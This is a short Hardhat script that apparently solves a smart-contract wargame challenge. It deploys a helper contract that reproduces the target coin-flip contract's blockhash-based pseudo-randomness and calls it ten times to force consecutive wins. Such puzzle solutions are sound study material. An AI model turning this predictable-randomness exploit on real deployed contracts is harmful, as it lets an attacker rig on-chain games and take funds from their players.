const { BigNumber } = require("ethers");
const { ethers } = require("hardhat");

const INSTANCE = '0x892B132F15BDf4437d70d38ED386a48A1c7Fb8ED'
const abi = [
    "function flip(bool _guess) public returns (bool)",
    "function consecutiveWins() public view returns (uint)"
]

const delay = ms => new Promise(res => setTimeout(res, ms))

async function hack(contract, signer) {
    const CoinGuesser = await ethers.getContractFactory("CoinGuesser");
    const coinguesser = await CoinGuesser.deploy(contract.address);
    await coinguesser.deployed();
    console.log("CoinGuesser Deployed To:", coinguesser.address);

    for (let i = 0; i < 10; i++) {
        try {
            // The guessRight() function uses same "randomness" logic as contract, so gets same result.
            const tx = await coinguesser.guessRight();
            await tx.wait();
            console.log('Guessed!');
        } catch (err) {
            console.log(err);
        }

        const wins = await contract.consecutiveWins();
        console.log(`Consecutive Wins: ${wins}`);
        
        // Contract doesn't allow multiple calls on same block. 
        // This shouldn't happen but for some reason does, and this mostly resolves it.
        await delay(15000)
    }

    console.log("You must be psychic!")
}

const signer = ethers.getSigner().then(signer => {
    const contract = new ethers.Contract(INSTANCE, abi, signer);
    console.log('Contract Setup Completed.')
    hack(contract, signer)
})